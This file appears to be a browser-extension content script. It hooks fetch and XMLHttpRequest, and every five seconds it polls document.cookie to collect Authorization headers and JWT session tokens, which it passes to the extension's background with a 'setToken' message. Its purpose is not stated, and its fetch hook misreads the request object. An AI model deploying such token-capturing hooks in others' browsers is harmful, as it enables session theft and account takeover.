(function () {
  // Intercept fetch - capture from requests AND responses
  const origFetch = window.fetch;
  window.fetch = function () {
    const result = origFetch.apply(this, arguments);
    result.then(function (response) {
      try {
        // Check request headers
        const req = arguments[0];
        if (req && req.headers) {
          let authHeader = null;
          if (req.headers instanceof Headers) {
            authHeader = req.headers.get('authorization');
          } else if (typeof req.headers === 'object') {
            authHeader = req.headers['Authorization'] || req.headers['authorization'];
          }
          if (authHeader && authHeader.length > 20) {
            browser.runtime.sendMessage({ action: 'setToken', token: authHeader });
          }
        }
        // Check response headers
        const auth = response.headers.get('authorization');
        if (auth && auth.length > 20) {
          browser.runtime.sendMessage({ action: 'setToken', token: auth });
        }
        // Check Set-Cookie
        const setCookie = response.headers.get('set-cookie');
        if (setCookie) {
          const match = setCookie.match(/=([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)/g);
          if (match) {
            match.forEach(function (m) {
              const token = m.split('=')[1];
              if (token && token.split('.').length === 3) {
                browser.runtime.sendMessage({ action: 'setToken', token: token });
              }
            });
          }
        }
      } catch (e) {}
    }).catch(function () {});
    return result;
  };

  // Intercept XHR
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;

  XMLHttpRequest.prototype.open = function () {
    this._hdrs = {};
    return origOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.setRequestHeader = function (name, value) {
    if (this._hdrs) this._hdrs[name.toLowerCase()] = value;
    return origSetHeader.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function () {
    if (this._hdrs) {
      const auth = this._hdrs['authorization'];
      if (auth && auth.length > 20) {
        browser.runtime.sendMessage({ action: 'setToken', token: auth });
      }
    }
    // Also capture response
    const self = this;
    const origOnReady = this.onreadystatechange;
    this.onreadystatechange = function () {
      if (self.readyState === 4) {
        try {
          const auth = self.getResponseHeader('authorization');
          if (auth && auth.length > 20) {
            browser.runtime.sendMessage({ action: 'setToken', token: auth });
          }
          const setCookie = self.getResponseHeader('set-cookie');
          if (setCookie) {
            const match = setCookie.match(/=([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)/g);
            if (match) {
              match.forEach(function (m) {
                const token = m.split('=')[1];
                if (token && token.split('.').length === 3) {
                  browser.runtime.sendMessage({ action: 'setToken', token: token });
                }
              });
            }
          }
        } catch (e) {}
      }
      if (origOnReady) origOnReady.apply(this, arguments);
    };
    return origSend.apply(this, arguments);
  };

  // Also try to find token from cookies (non-httponly readable ones)
  function checkCookiesForJWT() {
    const cookies = document.cookie.split(';');
    for (const c of cookies) {
      const val = decodeURIComponent(c.trim().split('=').slice(1).join('='));
      if (val && val.split('.').length === 3 && val.length > 50) {
        try {
          const p = JSON.parse(atob(val.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
          if (p && typeof p === 'object') {
            browser.runtime.sendMessage({ action: 'setToken', token: val });
          }
        } catch (e) {}
      }
    }
  }

  checkCookiesForJWT();
  setInterval(checkCookiesForJWT, 5000);
})();
